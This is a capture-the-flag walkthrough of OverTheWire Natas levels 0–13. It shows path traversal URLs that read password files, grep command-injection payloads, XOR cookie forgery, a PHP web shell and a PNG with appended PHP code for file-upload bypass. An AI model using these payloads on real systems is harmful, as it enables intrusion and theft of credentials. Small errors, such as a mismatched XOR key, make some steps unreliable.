
# OverTheWire Natas Solutions

This is a collection of solution for the [OverTheWire Natas](https://overthewire.org/wargames/natas/) problems, a collection of 33 levels, each dealing with the basics of web security. All of the levels are found at http://natasX.natas.labs.overthewire.org, where X is the level number. <br>
Please use these as hints to solve the challenges yourself. Do not use them to cheat and not learn...
> "With borrowed power, you'll never walk the path of the almighty."
<br>\- Cid Kagenou, ["The Eminence in Shadow"](https://shadow-garden.jp/), Daisuke Aizawa

## Levels
- [Level 0](#level0)
- [Level 1](#level1)
- [Level 2](#level2)
- [Level 3](#level3)
- [Level 4](#level4)
- [Level 5](#level5)
- [Level 6](#level6)
- [Level 7](#level7)
- [Level 8](#level8)
- [Level 9](#level9) 
- [Level 10](#level10)
- [Level 11](#level11) 
- [Level 12](#level12) 
- [Level 13](#level13) 

## Level 0 <a name="level0"></a>
Level 0 is pretty straight-foward. After logging into the level using the password `natas0`, we get the following screen:

![Level 0](/imgs/lvl0/screenshot.png)

Viewing the page source results in us finding the password for the next level:
```html
<html>
    <head>
        ...
    </head>
    <body>
        <h1>natas0</h1>
        <div id="content">
            You can find the password for the next level on this page.

            <!--The password for natas1 is **** -->
        </div>
    </body>
</html>
```

## Level 1 <a name="level1"></a>
Landing on the site, we see this:

![Level 1](/imgs/lvl1/screenshot.png)

Since we can't see the source code by simply right-clicking, there's a keyboard shortcut that will open the [Developer Tools](https://firefox-source-docs.mozilla.org/devtools-user/) automatically: `<F12>`[^1]. <br> From there, inspecting the HTML code will give us the password:
```html
<html>
    <head>
        ...
    </head>
    <body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
        <h1>natas1</h1>
        <div id="content">
            You can find the password for the next level on this page, but rightclicking has been blocked!

        <!--The password for natas2 is **** -->
        </div>
    </body>
</html>
```

## Level 2 <a name="level2"></a>
Landing on the site, we see this:

![Level 2](/imgs/lvl2/screenshot.png)

Now that we are free from the constriction of no right-click, we can inspect the page freely. When we do, we find something peculiar:
```html
<html>
    <head>
        ...
    </head>
    <body>
        <h1>natas2</h1>
        <div id="content">
            There is nothing on this page
            <img src="files/pixel.png">
        </div>
    </body>
</html>
```
There's a 1x1 `pixel.png` image on the screen, right next to the string. One might think the solution is in the image, yet there's something more interesting next to it. <br> We can see a path to another folder, named `files/`. Adding that to the URL of the site, we get an index of files inside the Apache server:

![Index](/imgs/lvl2/index.png)

Upon clicking the `users.txt` file, we get some passwords, although only one is of interest to us:
```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:****
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

## Level 3 <a name="level3"></a>
Landing on the site, we see this:

![Level 3](/imgs/lvl2/screenshot.png)

The same page as [Level 2](#level2). Again, inspecting it gives us nothing, except...
```html
<html>
    <head>
        ...
    </head>
    <body>
        <h1>natas3</h1>
        <div id="content">
            There is nothing on this page
            <!-- No more information leaks!! Not even Google will find it this time... -->
        </div>
    </body>
</html>
```

The phrase "Not even Google will find it this time..." may seem like a provocation, yet it reveals something interesting: the [Robots Exclusion Protocol](https://en.wikipedia.org/wiki/Robots.txt):
> The Robots Exclusion Protocol is a standard used by websites to indicate to visiting web crawlers and other web robots which portions of the website they are allowed to visit. 

That's why Google won't be able to find it... <br> Anyways, this protocol implies the existence of a `robots.txt` file somewhere in the server. In fact, we can find it immediatly in http://natas3.natas.labs.overthewire.org/robots.txt :
```
User-agent: *
Disallow: /s3cr3t/
```
Seems like web crawlers aren't allowed to access a hiddent path called `/s3cr3t/`. Thankfully we aren't crawlers, we're hackers, so we can visit it easily. In http://natas3.natas.labs.overthewire.org/s3cr3t we find another Apache index, displaying a `users.txt` file like before:

![Index](/imgs/lvl3/index.png)

Clicking the file gives us the password to the next level:
```
natas4:****
```

## Level 4 <a name="level4"></a>
Landing on the site, we see this:

![Level 4](/imgs/lvl4/screenshot.png)

The site tells us it accepts only requests from a specific URL/webpage. To understand better what we are working with, let's do some theory:
> The web works by using protocols, in this case the [HTTP protocol](https://en.wikipedia.org/wiki/HTTP) (HyperText Transfer Protocol), which allows request-response communication between server and client. The request includes the request method, the requested URL and the protocol version. However, it can also include additional, potentially needed information, the _request headers_.

In this case, the header we're looking for is the [referer header](https://en.wikipedia.org/wiki/HTTP_referer), which specifies where the request is coming from, and that's exactly what we need. <br>
Opening the Developer Tools[^1], we can access the Network tab, where if we reload, we can see the traffic generated after:

![Network](/imgs/lvl4/network.png)


We can then access the `index.php` request (which I'll refer to now as the main one), and see the various headers sent. Thus, we need to "create" a referer header specifically to mask our real one. <br>
A little quirk about Developer Tools, is that it allows us to create/modify custom headers to send out. We'll do just that in this level. Right-clicking on the main request, and selecting "Edit and Resend", brings us to an editor. The solution for this level can only be accessed by http://natas5.natas.labs.overthewire.org, so we need to add in the last empty box the name "Referer", and value of the URL. <br>
Once done, we can send it, and get a response. Viewing it raw, we get the solution of the level:
```html
<html>
    <head>
      ...
    </head>
    <body>
        <h1>natas4</h1>
        <div id="content">
            Access granted. The password for natas5 is ****
            <br/>
            <div id="viewsource"><a href="index.php">Refresh page</a></div>
        </div>
    </body>
</html>
```

## Level 5 <a name="level5"></a>
Landing on the site, we see this:

![Level 5](/imgs/lvl5/screenshot.png)

Similarly to the past level, here we need some kind of authorization to view the full page. But how can the website know we aren't allowed to access it? It must _store_ some kind of information that prevents us from viewing it... <br> 
The only way a site remembers something is via [cookies](https://en.wikipedia.org/wiki/HTTP_cookie):
> An HTTP cookie is a small block of data created by a web server while a user is browsing a website and placed on the user's computer or other device by the user's web browser.

Not only it's stored locally, but it's part of a request header. Now, opening the Network tab in the Developer Tools[^1], and scrolling down, we see the cookie header is set to `loggedin=0`:

![Cookies](/imgs/lvl5/cookies.png)

Now, doing the same thing as before, we can edit and resend the header, adding another cookie header and setting it to `loggedin=1` (don't worry about deactivating the first one, only the last cookie will be executed). Doing so, gives us the raw HTML code with the solution:
```html
<html>
    <head>
        ...
    </head>
    <body>
        <h1>natas5</h1>
        <div id="content">
        Access granted. The password for natas6 is ****</div>
    </body>
</html>
```

## Level 6 <a name="level6"></a>
Landing on the site, we see this:

![Level 6](/imgs/lvl6/screenshot.png)

We notice an input field, and a source code link. Trying to input anything will result in an error, thus let's look at the code first. I'll just show the most important part:
```js
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

We notice there's a method for posting and checking the secret, yet no password. One thing that should be immediate, though, is the include file stored at `includes/secret.inc`. We can access it, and looking at the raw HTML, it shall give us the secret we need:
```js
<?
$secret = "****";
?>
```
Now that we know the secret, we can just go back to the main page, and input it. The result is the password for the next level:
```html
<html>
    <head>
        ...
    </head>
    <body>
        <h1>natas6</h1>
        <div id="content">

            Access granted. The password for natas7 is ****
            <form method=post>
                Input secret: <input name=secret><br>
                <input type=submit name=submit>
            </form>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>
```

## Level 7 <a name="level7"></a>
Landing on the site, we see this:

![Level 7](/imgs/lvl7/screenshot.png)

A simple link brings us to the different pages in the web app. Nothing strange, except if we look to the URL: `http://natas7.natas.labs.overthewire.org/index.php?page=home` and `http://natas7.natas.labs.overthewire.org/index.php?page=about`. Whenever we change site, so does the URL. This is because the HTTP Protocol for GET (which is what is used here to "get" the pages) displays, after the `?`, variables used in the search. The variable here is `pages=` followed by the page. If we try to modify it to whatever, we get the following error:

![Error](/imgs/lvl7/error.png)

No matter what we try, we never get a valide response. But if we dig deeper, especially in the code for the page itself, we see this:
```html
<html>
    <head>
        ...
    </head>
    <body>
        <h1>natas7</h1>
        <div id="content">

            <a href="index.php?page=home">Home</a>
            <a href="index.php?page=about">About</a>
            <br>
            <br>
            this is the front page

            <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
        </div>
    </body>
</html>
```
So there is a path where the password is stored[^2]. Yet how can we access it when there's no way to move around in a web server? Here comes in play the GET variable from earlier... <br>
For those who don't use Linux, or aren't familiar to its Shell syntax, to move around folders one can use the command `cd /path_to_folder/`, and to move out, simply `cd ..` where the double dots represent the parent directory to where you are. <br>
We can use this to out advantage to "escalate" the folder, and reach the desider path in `/etc/natas_webpass/natas8`. After trial and error, one can come up to an URL like this: <br>
`http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8` <br>
And there, our password is shown.

## Level 8 <a name="level8"></a>
Landing on the site, we see this:

![Level 8](/imgs/lvl8/screenshot.png)

Same as [Level 6](#level6), yet checking the source code from the link gives us different code:
```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
Reading through it, we need to get a string such that when it's encoded by the function `encodeSecret`, it gives us the `$encodedSecret` value. Let's go through the function step-by-step:
```php
function encodeSecret($secret) {
    return a binary-to-hexadecimal... 
       ↓       ↓
    return bin2hex(strrev(base64_encode($secret)));
                      ↑               ↑   
       ...Of the inverse string of a base64 encoded string
}
```
What the level requires us to do, is a little reverse engineering of the algorithm that encodes the secret. Now that we know what it does, using the inverse logic, we can reverse the process of encoding to get the original string it was used to encode the secret. <br> 
Let's create a PHP file (or use an online editor like [this one](https://www.programiz.com/php/online-compiler/)) to undo the encoding. Simply, we need to do the opposite of the algorithm:
```php
function encodeSecret($secret) {
    return a base64 decode... 
       ↓       ↓
    return base64_decode(strrev(hex2bin($secret)));
                      ↑               ↑   
       ...Of the inverse string of a hexadecimal-to-binary string
}
```
And feeding into the function the `$encodedSecret`, we get the `$decodedSecret = "oubWYf2kBq"`. <br>
We can now input it into the web app, and it'll give us the password for the next level:
```html
<html>
    <head>
        ...
    </head>
    <body>
        <h1>natas8</h1>
        <div id="content">

            Access granted. The password for natas9 is ****
            <form method=post>
                Input secret: <input name=secret><br>
                <input type=submit name=submit>
            </form>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>
```

## Level 9 <a name="level9"></a>
Landing on the site, we see this:

![Level 9](/imgs/lvl9/screenshot.png)

Where the input field is used to check if a word is present in a `dictionary.txt` file, as the link tells us:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
Looking closer, we see the key is not sanitized in any way, thus we can exploit this weakness and use it to our advantage in an XSS attack to gain information about the password. The biggest problem, though, is the [`grep`](https://en.wikipedia.org/wiki/Grep) command, which we need to escape from. <br>
Looking at the [`man`](https://en.wikipedia.org/wiki/Man_page) pages for it, we see that running the `--help` flag will print out, and then exit. Exactly what we need to execute remote Shell commands on the server. Let's try it: we'll create a payload like this one, and see what happens to the output... <br>
Payload: `--help && pwd # `&emsp;← Beware of the final space, it's necessary or it won't work

Output:

[Output](/imgs/lvl9/output.png)

And so, we know we're in `/var/www/natas/natas9` and can now freely navigate around the folders inside the server. If one read the rules closely, we know that:
> All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.

Thus we need to get to `/etc/natas_webpass/natas10` and we'll have our password. Using the same structure as [Level 7](#level7), we can access it, and retrieve the secret hid in plain sight at the last line: <br>
`--help && cat ../../../../etc/natas_webpass/natas10 # `

## Level 10 <a name="level10"></a>
Landing on the site, we see this:

![Level 10](/imgs/lvl10/screenshot.png)

Now we can't directly concatenate commands in the input field, since in the source code, any character in the list cannot be used:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
So now we can't use `[ ; | & ]`. Luckly for us, the command is still `grep`, which we can abuse to spit out the contents of a file. But how can we access the `/etc/natas_webpass/natas11` if we can't move around? Well, we can just feed the path into `grep`, and he'll do the work for us. <br>
Modifing a bit the payload, we can retrieve and display the password for the next level: <br>
Payload: `{random character} ../../../../etc/natas_webpass/natas11 #` <br>
Output: 
```html
<html>
    <head>
        ...
    </head>
    <body>
        <h1>natas10</h1>
        <div id="content">

            For security reasons, we now filter on certain characters<br/><br/>
            <form>
                Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
            </form>


            Output:
            <pre>
                ****
            </pre>

            <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
        </div>
    </body>
</html>
```

## Level 11 <a name="level11"></a>
Landing on the site, we see this:

![Level 11](/imgs/lvl11/screenshot.png)

A simple input that changes the background color to a hexadecimal value. The text above, though, is what's scary. Let's check out the source code:
```php
<?
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>

...

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
?>
```
Let's take a look at the cookie that's sent to the server:

![Cookie](/imgs/lvl11/cookie.png)

Indeed, there's some [XOR cypher](https://en.wikipedia.org/wiki/XOR_cipher) on the cookie that's sent, where we could've edited some information about the `showpassword` field. By definition, a XOR cypher isn't exactly the most secure one:
> The XOR operator is extremely common as a component in more complex ciphers. By itself, using a constant repeating key, a simple XOR cipher can trivially be broken using frequency analysis. If the content of any message can be guessed or otherwise known then the key can be revealed. Its primary merit is that it is simple to implement, and that the XOR operation is computationally inexpensive. A simple repeating XOR (i.e. using the same key for xor operation on the whole data) cipher is therefore sometimes used for hiding information in cases where no particular security is required.

Expecially when the message contains sensible information mixed in. It would be easy to reverse engineer the solution by decoding and XORing the data, but the `key` is hidden to us. We need to find what it is in order to pass the level. <br>
We can exploit the fact that XOR is an associative operation: $\text{plaintext} ⊕ \text{key} = \text{ciphertext} \Rightarrow$ <br> $\text{ciphertext} ⊕ \text{key} = \text{plaintext} \land \text{ciphertext} ⊕ \text{plaintext} = \text{key}$. <br>
We know the $\text{ciphertext}$ (which is our cookie), but we need the $\text{plaintext}$ in order to find the key. We can generate it by using the same code that's used to save data, naturally without the XOR function:
```php
<?php
$d = array( "showpassword" => "no", "bgcolor" => "#ffffff");
echo base64_encode(json_encode($d));
?>
```
What we get is the $\text{ciphertext}=$`eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=`. Using an online encoder (I highly suggest [this one](https://gchq.github.io/CyberChef/)), we can XOR the two and get the key used: <br>
`HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=` ⊕ `eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=` $=$ `eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe` <br>
Since XOR repeats the key for the size of the input, we have `$key =  eDWo`. Editing the code for the encryption function, we can now generate a new cookie that has `"showpassword" => "yes"`:
```php
<?php
function xor_encrypt($in) {
    $key = 'qw8J';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
$d = array( "showpassword" => "yes", "bgcolor" => "#ffffff");
echo base64_encode(xor_encrypt(json_encode($d)));
?>
```
The new cookie generated is `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`. This cookie has the option to show the password, so when we add it to the request header like `data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`, we get the solution:
```html
<html>
    <head>
        ...
    </head>

    <h1>natas11</h1>
    <div id="content">
        <body style="background: #ffffff;">
                Cookies are protected with XOR encryption<br/><br/>
                
                The password for natas12 is ****
                <form>
                        Background color: <input name=bgcolor value="#ffffff">
                        <input type=submit value="Set color">
                </form>

                <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
                </div>
        </body>
</html>
```

## Level 12 <a name="level12"></a>
Landing on the site, we see this:

![Level 12](/imgs/lvl12/screenshot.png)

We can browse our files, and then upload one onto the server at the `/upload/` folder. The problem is, the name is jangled in the code via a random name generator:
```php
`<?php  
  
function genRandomString() {  
	$length = 10;  
	$characters = "0123456789abcdefghijklmnopqrstuvwxyz";  
	$string = "";  
  
	for ($p = 0; $p < $length; $p++) {  
		$string .= $characters[mt_rand(0, strlen($characters)-1)];  
	}  
  
	return $string;  
}  
  
function makeRandomPath($dir, $ext) {  
	do {  
		$path = $dir."/".genRandomString().".".$ext;  
	} while(file_exists($path));  
		return $path;  
}  
  
function makeRandomPathFromFilename($dir, $fn) {  
	$ext = pathinfo($fn, PATHINFO_EXTENSION);  
	return makeRandomPath($dir, $ext);  
}  
  
if(array_key_exists("filename", $_POST)) {  
	$target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);  
  
  
	if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {  
		echo "File is too big";  
	} else {  
		if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {  
			echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";  
		} else{  
			echo "There was an error uploading the file, please try again!";  
		}  
	}  
} else {  
?>
<form enctype="multipart/form-data" action="index.php" method="POST">  
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />  
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />  
Choose a JPEG to upload (max 1KB):<br/>  
<input name="uploadedfile" type="file" /><br />  
<input type="submit" value="Upload File" />  
</form>  
<?php } ?>
```
Focusing too much on decrypting the random name generator is just wasting time. But if one looks closer, we see we have no restriction on what we can send as file. <br>
This immediately rings a bell, as this is a simple [web shell attack](https://en.wikipedia.org/wiki/Web_shell), where we upload a file with malicious code, that'll run on the server-side of the web app. Let's try it right away... We're going to create a file (since the server runs PHP commands, it's a PHP script) that'll print us something to make sure we can execute code:
`shell.php`
```
<?php 
	$output = shell_exec('pwd');  
	echo $output;
?>
```
Okay, let's feed it into the web app...
![Shell](/imgs/lvl12/shell.png)
While we're fine with another name, the server does have some restriction (although very minimal) to files, since it automatically changes them to `.jpg` by default. We need to circumvent how files are named to actually execute server-side code. <br>
If one looks closer at the HTML code this time, we see something hidden in plain sight:
```html
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />  
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
```
There are two hidden input fields, that actually display vital information we can manipulate. In the Developer Tools[^1], we can edit the HTML code to show them:
![Hidden fields](/imgs/lvl12/hidden.png)
While we don't care about the size, we can manipulate the files name via the input field. That's great news since that's what we wanted. Now let's change the file type to `.php` and see what the site responds once we check it out. If all went correctly, it should display the current working directory: 
![pwd](/imgs/lvl12/pwd.png)
And in fact it does! That's great news. Now we can use this to our advantage to get the next level's password by navigating the web server just like how we did in [Level 7](#level7), [Level 9](#level9) and [Level 10](#level10). Modifing the `shell.php` script to move to the solution path is relatively easy (after some trial and error):
```php
<?php 
	$output = shell_exec('cat ../../../../../etc/natas_webpass/natas13');  
	echo $output;
?>
```

## Level 13 <a name="level13"></a>
Landing on the site, we see this:

![Level 13](/imgs/lvl13/screenshot.png)

Now things get trickier... We cannot pass anything except a `.jpg` file. Or at least, that's what the web site wants us to think:
```php
`<?php  
  
function genRandomString() {  
	$length = 10;  
	$characters = "0123456789abcdefghijklmnopqrstuvwxyz";  
	$string = "";  
  
	for ($p = 0; $p < $length; $p++) {  
		$string .= $characters[mt_rand(0, strlen($characters)-1)];  
	}  
  
	return $string;  
}  
  
function makeRandomPath($dir, $ext) {  
	do {  
		$path = $dir."/".genRandomString().".".$ext;  
	} while(file_exists($path));  
	return $path;  
}  
  
function makeRandomPathFromFilename($dir, $fn) {  
	$ext = pathinfo($fn, PATHINFO_EXTENSION);  
	return makeRandomPath($dir, $ext);  
}  
  
if(array_key_exists("filename", $_POST)) {  
	$target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);  
  
	$err=$_FILES['uploadedfile']['error'];  
	if($err){  
		if($err === 2){  
			echo "The uploaded file exceeds MAX_FILE_SIZE";  
		} else{  
			echo "Something went wrong :/";  
		}  
	} else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {  
		echo "File is too big";  
	} else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {  
		echo "File is not an image";  
	} else {  
		if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {  
			echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";  
		} else{  
			echo "There was an error uploading the file, please try again!";  
		}  
	}  
} else {  
?>  
  
<form enctype="multipart/form-data" action="index.php" method="POST">  
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />  
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />  
Choose a JPEG to upload (max 1KB):<br/>  
<input name="uploadedfile" type="file" /><br />  
<input type="submit" value="Upload File" />  
</form>  
<?php } ?>`
```
Scary is it sounds, `exif_imagetype($_FILES['uploadedfile']['tmp_name'])` (which is what checks if the file in input is a image or not) is actually pretty flawed. As its [manual](https://www.php.net/manual/en/function.exif-imagetype.php) says:
> exif_imagetype() reads the first bytes of an image and checks its signature.

Let me rephrase that, so that it's clearer: 
> exif_imagetype() reads **only** the first bytes of an image and checks its signature

It does not check file type or anything else. Thus, we can use this to our favour and create a fake `.png` file that will execute malicious code inside. But how do we make an image file run code? <br>
Using some command trickery, we can append PHP comment to a file and then rename it to `.php` as we did in [Level 12](#level12) to execute server-side code. Here are the commands[^3]:

```bash
cp /random/file.png .		# <- copy a random png file to working directory
mv file.png shell.png		# rename because it's cooler B)
convert -resize 9x9 shell.png shell.png		# <- resize the image so that we don't exceed size limits. 
echo '<?php $output = shell_exec("pwd"); echo $output; ?>' >> shell.png # append our malicious code to the image
mv shell.png shell.php		# change file type
``` 

One may ask: why all of this if we get at the end a `.php` file? Well, since we started with a `.png`, the first few bytes read by `exif_imagetype()` fool it to think it's an image, while the rest of our code is further down the file. <br>
We can now upload the file (remember to change the file type in the hidden input field) and see what happens:
![pwd](/imgs/lvl13/pwd.png)
Ignoring the gibberish in the top, we see our path is `/var/www/natas/natas13/upload`. Same as before, let's change the code so that we can see the password to the next challenge:
```bash
# ...
echo '<?php $output = shell_exec("cat /../../../etc/natas_webpass/natas14"); echo $output; ?>' >> shell.png
# ...
```

## Level 14 <a name="level14"></a>
Landing on the site, we see this:

![Level 14](/imgs/lvl14/screenshot.png)


[^1]: I'll be using FireFox, and DevTools and some shortcuts are different from one another, although they're mostly similar in functionality.
[^2]: It's also written in the [main page](https://overthewire.org/wargames/natas/) of the web challenge, if one doesn't want to use hints.
[^3]: \- `convert` is part of [ImageMagick](https://github.com/ImageMagick/ImageMagick), necessary to have a smaller image (9x9 is a arbitrary dimension I chose).
\- `>>` redirect stdout to file.
\- Thanks to [Synactivy](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there)  for some of the commands and explanations.




